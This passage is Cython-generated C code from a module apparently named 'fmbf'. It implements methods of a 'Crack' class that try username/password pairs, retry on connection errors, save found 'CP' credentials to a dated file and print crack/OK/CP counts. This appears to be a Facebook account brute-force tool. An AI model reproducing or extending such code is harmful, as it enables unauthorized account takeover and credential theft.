          __pyx_t_17 = __Pyx_PyUnicode_Join(__pyx_t_1, 7, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 292, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_17); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 292, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          __pyx_t_17 = __Pyx_PyUnicode_Concat(__pyx_kp_u_CP_3, __pyx_t_3); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GIVEREF(__pyx_t_17);
          PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_17);
          __Pyx_INCREF(__pyx_n_s_a);
          __Pyx_GIVEREF(__pyx_n_s_a);
          PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_n_s_a);
          __pyx_t_17 = 0;
          __pyx_t_17 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_3, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          __pyx_t_17 = PyTuple_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_8 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u__73);
          __pyx_t_8 += 8;
          __Pyx_GIVEREF(__pyx_kp_u__73);
          PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_kp_u__73);
          __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
          __Pyx_GIVEREF(__pyx_t_6);
          PyTuple_SET_ITEM(__pyx_t_17, 1, __pyx_t_6);
          __pyx_t_6 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_17, 2, __pyx_kp_u__71);
          __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
          __Pyx_GIVEREF(__pyx_t_6);
          PyTuple_SET_ITEM(__pyx_t_17, 3, __pyx_t_6);
          __pyx_t_6 = 0;
          __Pyx_INCREF(__pyx_kp_u__39);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__39);
          PyTuple_SET_ITEM(__pyx_t_17, 4, __pyx_kp_u__39);
          __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_17, 5, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          __pyx_t_17 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_17)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_17);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_1 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_17, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_6);
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          goto __pyx_L10_break;

          
        }

        
         {
          goto __pyx_L9_continue;
        }

        
        __pyx_L9_continue:;
      }
      __pyx_L10_break:;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    
    __Pyx_ErrFetch(&__pyx_t_2, &__pyx_t_1, &__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 296, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_23 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_2, __pyx_t_6);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_ErrRestore(__pyx_t_2, __pyx_t_1, __pyx_t_3);
    __pyx_t_2 = 0; __pyx_t_1 = 0; __pyx_t_3 = 0;
    if (__pyx_t_23) {
      __Pyx_AddTraceback("fmbf.Crack.metode_api", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 296, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_2);

      
      __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_time); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 299, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_17);
      __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_sleep); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 299, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_16);
      __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
      __pyx_t_17 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_16))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_16, function);
        }
      }
      __pyx_t_6 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_17, __pyx_int_32) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_int_32);
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 299, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_metode_api); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 300, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_16);
      __pyx_t_17 = NULL;
      __pyx_t_23 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
        __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_16);
        if (likely(__pyx_t_17)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
          __Pyx_INCREF(__pyx_t_17);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_16, function);
          __pyx_t_23 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_16)) {
        PyObject *__pyx_temp[3] = {__pyx_t_17, __pyx_v_user, __pyx_v_pwx};
        __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_16, __pyx_temp+1-__pyx_t_23, 2+__pyx_t_23); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L5_except_error)
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_GOTREF(__pyx_t_6);
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_16)) {
        PyObject *__pyx_temp[3] = {__pyx_t_17, __pyx_v_user, __pyx_v_pwx};
        __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_16, __pyx_temp+1-__pyx_t_23, 2+__pyx_t_23); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L5_except_error)
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_GOTREF(__pyx_t_6);
      } else
      #endif
      {
        __pyx_t_7 = PyTuple_New(2+__pyx_t_23); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 300, __pyx_L5_except_error)
        __Pyx_GOTREF(__pyx_t_7);
        if (__pyx_t_17) {
          __Pyx_GIVEREF(__pyx_t_17); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_17); __pyx_t_17 = NULL;
        }
        __Pyx_INCREF(__pyx_v_user);
        __Pyx_GIVEREF(__pyx_v_user);
        PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_23, __pyx_v_user);
        __Pyx_INCREF(__pyx_v_pwx);
        __Pyx_GIVEREF(__pyx_v_pwx);
        PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_23, __pyx_v_pwx);
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_16, __pyx_t_7, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 300, __pyx_L5_except_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      }
      __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
    __pyx_L8_try_end:;
  }

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 301, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyInt_AddObjC(__pyx_t_2, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 301, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_t_1) < 0) __PYX_ERR(0, 301, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_AddTraceback("fmbf.Crack.metode_api", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_ses);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XDECREF(__pyx_gb_4fmbf_5Crack_10metode_api_2generator);
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_5Crack_9metode_validate(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); 
static PyMethodDef __pyx_mdef_4fmbf_5Crack_9metode_validate = {"metode_validate", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_4fmbf_5Crack_9metode_validate, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_4fmbf_5Crack_9metode_validate(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_user = 0;
  PyObject *__pyx_v_pwx = 0;
  PyObject *__pyx_v_url = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("metode_validate (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_user,&__pyx_n_s_pwx,&__pyx_n_s_url,0};
    PyObject* values[4] = {0,0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  4: values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
        CYTHON_FALLTHROUGH;
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_user)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("metode_validate", 1, 4, 4, 1); __PYX_ERR(0, 303, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pwx)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("metode_validate", 1, 4, 4, 2); __PYX_ERR(0, 303, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  3:
        if (likely((values[3] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_url)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("metode_validate", 1, 4, 4, 3); __PYX_ERR(0, 303, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "metode_validate") < 0)) __PYX_ERR(0, 303, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 4) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
      values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
    }
    __pyx_v_self = values[0];
    __pyx_v_user = values[1];
    __pyx_v_pwx = values[2];
    __pyx_v_url = values[3];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("metode_validate", 1, 4, 4, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 303, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("fmbf.Crack.metode_validate", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_4fmbf_5Crack_8metode_validate(__pyx_self, __pyx_v_self, __pyx_v_user, __pyx_v_pwx, __pyx_v_url);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_5Crack_8metode_validate(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_user, PyObject *__pyx_v_pwx, PyObject *__pyx_v_url) {
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_ses = NULL;
  PyObject *__pyx_v_get = NULL;
  PyObject *__pyx_v_data = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_post = NULL;
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_8genexpr1__pyx_v_x = NULL;
  PyObject *__pyx_8genexpr1__pyx_v_y = NULL;
  PyObject *__pyx_8genexpr2__pyx_v_key = NULL;
  PyObject *__pyx_8genexpr2__pyx_v_value = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  Py_ssize_t __pyx_t_4;
  Py_UCS4 __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *(*__pyx_t_12)(PyObject *);
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_t_21;
  int __pyx_t_22;
  int __pyx_t_23;
  int __pyx_t_24;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("metode_validate", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_stdout); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyTuple_New(11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = 0;
  __pyx_t_5 = 127;
  __Pyx_INCREF(__pyx_kp_u__62);
  __pyx_t_4 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__62);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u__62);
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_N); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u_crack);
  __pyx_t_4 += 12;
  __Pyx_GIVEREF(__pyx_kp_u_crack);
  PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_crack);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u__48);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__48);
  PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_kp_u__48);
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_tampung); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_OK_2);
  __pyx_t_4 += 7;
  __Pyx_GIVEREF(__pyx_kp_u_OK_2);
  PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_kp_u_OK_2);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_3, 7, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_CP_2);
  __pyx_t_4 += 8;
  __Pyx_GIVEREF(__pyx_kp_u_CP_2);
  PyTuple_SET_ITEM(__pyx_t_3, 8, __pyx_kp_u_CP_2);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_3, 9, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u__2);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__2);
  PyTuple_SET_ITEM(__pyx_t_3, 10, __pyx_kp_u__2);
  __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_3, 11, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 304, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
